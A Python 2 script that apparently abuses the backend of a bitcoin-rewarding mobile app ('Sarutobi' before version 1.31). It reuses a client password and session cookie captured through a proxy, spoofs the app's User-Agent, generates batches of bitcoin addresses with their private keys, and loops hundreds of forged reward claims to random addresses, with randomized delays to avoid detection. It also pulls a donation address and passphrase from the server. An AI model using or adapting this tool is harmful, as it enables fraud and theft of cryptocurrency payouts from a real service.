import requests
import time
import random
import keyUtils
import os

#Sarutobi31 for Sarutobi version < 1.31 (Jan 13, 2015)
#Get these details from a middle proxy
#obviously these variables have been modified to be publishable

client_pass = "dadfisasf#@$sdf3sfR"
cookie = "laravel_session=eyJpdiI6RnJnelpCTHE2bzRyTkFsfgr443sI\
                   nZhbHVlIjoiak4yUXFOd0lQWGl5Z05md1BcL2d2NGxFdsfrttr3U0hKTn\
                   RWdFwvWXRcL1RTZ1h6bzJjN34ffUk5xRE91WHpZdHF2NjlKYUI4OWV4c2h\
                   keW00dGc9PSIsIm1hYyI6IjUxMzNhZDNjYjQwNDdmYfsfgrr23U4NzIx\
                   MmY2YWMerg43WZjMDFmNTA2YzVlOGE3MWE1MDcdsfrr3q%3D%3D"

headers = { 'Host':'quiet-fjord-4825.herokuapp.com',
      'Content-Type':'application/x-www-form-urlencoded',
      'Cookie':cookie,
      'Connection':'keep-alive',
      'Proxy-Connection':'keep-alive',
      'Accept':'*/*',
      'User-Agent':'swing/com.mandelduck.swing (1.601; OS Version 8.1 (Build12B411))',
      'Accept-Language':'en;q=1.0',
      'Accept-Encoding':'gzip;q=1.0,compress;q=0.5'}


def sendReward(address, i=0):
    global cookie
    url = "https://quiet-fjord-4825.herokuapp.com/sendReward"
    payload = {
    'password':client_pass,
    'toAddress':address
    }
    try:
        r = requests.post(url, data=payload, headers=headers)
    except (requests.exceptions.MissingSchema) as e:
        print "HTTP ERROR"
        print e
    print r.text
    if not ("html" in r.text):
        if r.json()["thestatus"] == "sent" or i % 100 == 0:
            print address
            cookie = r.headers["set-cookie"].split(';')[0]
            print cookie
    else:
        print r.text



def getData(passw):
    url = "https://quiet-fjord-4825.herokuapp.com/getData"
    payload = {'password':passw}
    try:
        r = requests.post(url, data=payload, headers=headers)
    except (requests.exceptions.MissingSchema) as e:
        print "HTTP ERROR"
        print e
    if ("error" in r.text):
        print "Error (probably password is wrong)"
    elif not ("html" in r.text):
        print   "Donation Address: " + str(r.json()["pk"]) + \
                " Distance: " + str(r.json()["distance"]) + \
                " Passphrase: " + str(r.json()["passphrase"])
    else:
        r.text


def genNewAddresses(num):
    addresses_list={}
    for i in xrange(1,num):
        private_key = os.urandom(32).encode('hex')
        addresses_list[keyUtils.keyToAddr(private_key)]=keyUtils.privateKeyToWif(private_key)
        #print keyUtils.keyToAddr(private_key)+ " : "+ keyUtils.privateKeyToWif(private_key)
    print "== Import genwallet.key in multibit == "
    print "======================================="
    file = open('genwallet.key','a')
    pubkeys = open('pubkeys.txt','a')
    for key in addresses_list:
        pubkey = key
        line = addresses_list[key] + "  2015-01-12T01:00:17Z\n"
        print key + " : " + line
        pubkeys.write(key+"\n")
        file.write(line)
    file.close()
    pubkeys.close()
    print "======================================="


def read_addresses(file):
    global addresses
    with open(file) as f:
        addresses = f.read().splitlines()
    #print addresses
    return addresses


def playBitches():
    for i in xrange(1,999):
        print str(i)
        rand = random.randint(1,9)
        getData(client_pass)
        time.sleep(1*rand)
        address_num = random.randint(1,len(addresses)-1)
        sendReward(addresses[address_num],i)
        time.sleep(rand+5)



if __name__ == "__main__" :

    if (os.path.exists("./pubkeys.txt")):
        addresses = read_addresses("pubkeys.txt")
        address = addresses[0]
        playBitches()
    else:
        print "Generating bitcoin addresses"
        genNewAddresses(10)
        print "Done, please rerun the script"


